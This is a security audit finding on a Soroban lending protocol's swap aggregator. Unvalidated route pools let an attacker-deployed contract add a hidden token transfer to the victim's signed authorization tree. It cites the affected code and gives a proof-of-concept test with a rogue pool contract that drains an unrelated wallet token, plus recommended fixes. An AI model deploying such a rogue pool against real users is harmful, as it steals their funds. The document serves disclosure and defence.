### Title
Unvalidated swap-route pool executes attacker code and drains caller-authorized tokens - ([File: contracts/swap-aggregator/src/execute/mod.rs](https://github.com/Alyssadaypin/rs-lending-xlm--019/blob/master/contracts/swap-aggregator/src/execute/mod.rs))

### Summary
A crafted `swap` payload can name an arbitrary contract as a route pool; the aggregator invokes it without checking a venue allowlist, allowing that contract to add an unrelated `token.transfer(victim, attacker, amount)` beneath the victim’s signed `swap_collateral` authorization tree. [1](#0-0) [2](#0-1) [3](#0-2) 

### Finding Description
`swap_collateral(caller, account_id, current, amount, new, swap)` accepts opaque route bytes and requires authorization from the account owner or delegate. [4](#0-3) [5](#0-4) 

The controller forwards those bytes unchanged to the configured aggregator through `router.execute_strategy(&controller, &amount_in, swap)`. [6](#0-5) 

Inside the aggregator, a swap instruction resolves `pool`, `token_in`, and `token_out` from the attacker-controlled `assets` registry and calls `venues::dispatch_hop`. [1](#0-0) 

`Program::validate` checks that the pool registry index is in range, but it does not check that the pool belongs to the selected venue or to any approved set. [7](#0-6) [2](#0-1) 

For example, the Soroswap adapter invokes `get_reserves` and `swap` directly on `ctx.hop.pool`, so any deployed contract implementing those functions receives execution during the victim’s transaction. [8](#0-7) [9](#0-8) 

That malicious pool can request a token transfer from the victim’s address; simulation records the transfer as a child of the victim’s `swap_collateral` authorization, and enforcement accepts it if the victim signs the simulated tree. [10](#0-9) [3](#0-2) 

### Impact Explanation
An attacker can steal arbitrary SEP-41 token balances held by the victim, including assets completely unrelated to the lending position and not limited to the routed collateral. [11](#0-10) [12](#0-11) 

The swap can still return a fair output, so the controller’s positive-output check and final risk checks do not prevent the unrelated wallet transfer. [13](#0-12) [14](#0-13) 

### Likelihood Explanation
The route payload is user-supplied, intentionally supports venue-specific calls, and places no allowlist or code-hash restriction on the `assets[pool]` address. [15](#0-14) [16](#0-15) [2](#0-1) 

Exploitation requires the victim to submit a malicious route and sign the poisoned authorization tree produced by simulation; an unsigned malicious transfer fails and rolls back. [17](#0-16) 

The attack is nevertheless practical because the route is opaque XDR and honest simulation automatically embeds the rogue transfer into the authorization tree the wallet is asked to sign. [15](#0-14) [18](#0-17) 

### Recommendation
Bind every route pool to a governance-maintained venue/pool allowlist or verified pool registry before invoking it, rather than accepting an arbitrary `assets` entry. [16](#0-15) [2](#0-1) 

As a defense in depth, surface and reject authorization trees containing token transfers unrelated to the expected input transfer before signature; the repository’s harness shows that the rogue transfer appears as an explicit child under `swap_collateral`. [19](#0-18) 

### Proof of Concept
The harness defines a router-facing hop payload containing an attacker-deployed `RogueHopPool`, whose `swap` method transfers an unrelated `wallet_token` from Alice to the attacker. [20](#0-19) [21](#0-20) 

It then passes that route as the `swap` argument to `try_swap_collateral(alice, account_id, USDC, 50_000_000_000, ETH, route)`. [22](#0-21) 

Simulation records `token.transfer(alice, attacker, WALLET_BALANCE)` as a child of Alice’s `swap_collateral` authorization. [18](#0-17) 

Signing that recorded tree executes the transfer while still crediting the expected fair ETH output; Alice’s wallet balance becomes zero and the attacker receives `WALLET_BALANCE`. [3](#0-2)

### Citations

**File:** contracts/swap-aggregator/src/execute/mod.rs (L58-64)
```rust
    let StrategyPayload {
        amounts,
        assets,
        ops,
    } = payload;
    let program = Program::decode(&env, &ops, assets.len(), amounts.len());

```

**File:** contracts/swap-aggregator/src/execute/mod.rs (L152-165)
```rust
        Opcode::Swap(venue) => {
            let hop = SwapHop {
                pool: ctx.assets.get_unchecked(op.idx_a),
                token_in: ctx.assets.get_unchecked(op.idx_b),
                token_out: ctx.assets.get_unchecked(op.idx_c),
                venue,
            };
            let amount_in = resolve_amount(ctx, vault, op.mode, &hop.token_in, prev);
            if amount_in <= 0 {
                panic_with_error!(ctx.env, Error::InvalidAmount);
            }

            vault.withdraw(&hop.token_in, amount_in);
            let out = venues::dispatch_hop(ctx.env, ctx.router, &hop, amount_in, tokens_cache);
```

**File:** contracts/swap-aggregator/src/program.rs (L237-249)
```rust
    /// Validates every instruction's opcode, mode, and indices before execution begins,
    /// including the `Prev` chain, same-token swaps, and split-weight bounds.
    fn validate(&self, env: &Env, assets_len: u32, amounts_len: u32, weight_count: u32) {
        for i in 0..self.op_count {
            let record = self.raw(i);
            let Some(opcode) = Opcode::from_u8(record[field::OPCODE]) else {
                panic_with_error!(env, Error::InvalidRouteXdr);
            };
            let mode = Mode::from_u8(record[field::MODE]);
            let (idx_a, idx_b, idx_c) = (
                record[field::POOL] as u32,
                record[field::TOKEN_IN] as u32,
                record[field::TOKEN_OUT] as u32,
```

**File:** contracts/swap-aggregator/src/program.rs (L281-291)
```rust
            if idx_a >= assets_len || idx_b >= assets_len {
                panic_with_error!(env, Error::InvalidRouteXdr);
            }
            match opcode {
                Opcode::Swap(_) => {
                    if idx_c >= assets_len {
                        panic_with_error!(env, Error::InvalidRouteXdr);
                    }
                    if idx_b == idx_c {
                        panic_with_error!(env, Error::SameToken);
                    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L20-23)
```rust
const SWAP_IN_USDC: i128 = 50_000_000_000; // 5 000 USDC, 7 decimals
const FAIR_OUT_ETH: i128 = 25_000_000; // 2.5 ETH at $2 000
const WALLET_BALANCE: i128 = 77_770_000_000; // Alice's balance of a token the protocol never listed

```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L24-31)
```rust
#[contracttype]
#[derive(Clone)]
pub struct RoutedSwap {
    pub hop_pool: Address,
    pub min_out: i128,
    pub token_in: Address,
    pub token_out: Address,
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L56-70)
```rust
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L134-157)
```rust
    fn swap_args(&self, route: &Bytes) -> Vec<Val> {
        let (usdc, eth) = self.assets();
        (
            self.alice.clone(),
            self.account_id,
            usdc,
            SWAP_IN_USDC,
            eth,
            route.clone(),
        )
            .into_val(&self.t.env)
    }

    fn try_swap(&self, route: &Bytes) -> Result<(), soroban_sdk::Error> {
        let (usdc, eth) = self.assets();
        let ctrl = self.t.ctrl_client();
        let result = ctrl.try_swap_collateral(
            &self.alice,
            &self.account_id,
            &usdc,
            &SWAP_IN_USDC,
            &eth,
            route,
        );
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-226)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L239-255)
```rust
    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L258-268)
```rust
    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```

**File:** contracts/controller/src/lib.rs (L280-302)
```rust
    /// Withdraws `amount` of `current`, converts it to `new` via `swap` and
    /// redeposits the proceeds. Requires owner or delegate authorization.
    #[when_not_paused]
    fn swap_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        current: HubAssetKey,
        amount: i128,
        new: HubAssetKey,
        swap: Bytes,
    ) {
        strategies::swap_collateral::process_swap_collateral(
            &env,
            &caller,
            SwapCollateralParams {
                account_id,
                current: &current,
                from_amount: amount,
                new: &new,
                swap: &swap,
            },
        );
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-48)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
```

**File:** contracts/controller/src/strategies/swap.rs (L33-38)
```rust
    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/controller/src/strategies/swap.rs (L40-54)
```rust
    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** contracts/swap-aggregator/src/venues/soroswap.rs (L51-59)
```rust
pub(crate) fn swap(ctx: &HopContext<'_>) {
    let token_in_is_0 = ctx.hop.token_in < ctx.hop.token_out;

    let no_args: Vec<Val> = vec![ctx.env];
    let (reserve_0, reserve_1): (i128, i128) = ctx.env.invoke_contract(
        &ctx.hop.pool,
        &Symbol::new(ctx.env, "get_reserves"),
        no_args,
    );
```

**File:** contracts/swap-aggregator/src/venues/soroswap.rs (L71-87)
```rust
    let token_client = token::Client::new(ctx.env, &ctx.hop.token_in);
    token_client.transfer(ctx.router, &ctx.hop.pool, &ctx.amount_in);

    let (amount_0_out, amount_1_out) = if token_in_is_0 {
        (0_i128, requested_out)
    } else {
        (requested_out, 0_i128)
    };
    let args: Vec<Val> = vec![
        ctx.env,
        amount_0_out.into_val(ctx.env),
        amount_1_out.into_val(ctx.env),
        ctx.router.into_val(ctx.env),
    ];
    let _: () = ctx
        .env
        .invoke_contract(&ctx.hop.pool, &symbol_short!("swap"), args);
```
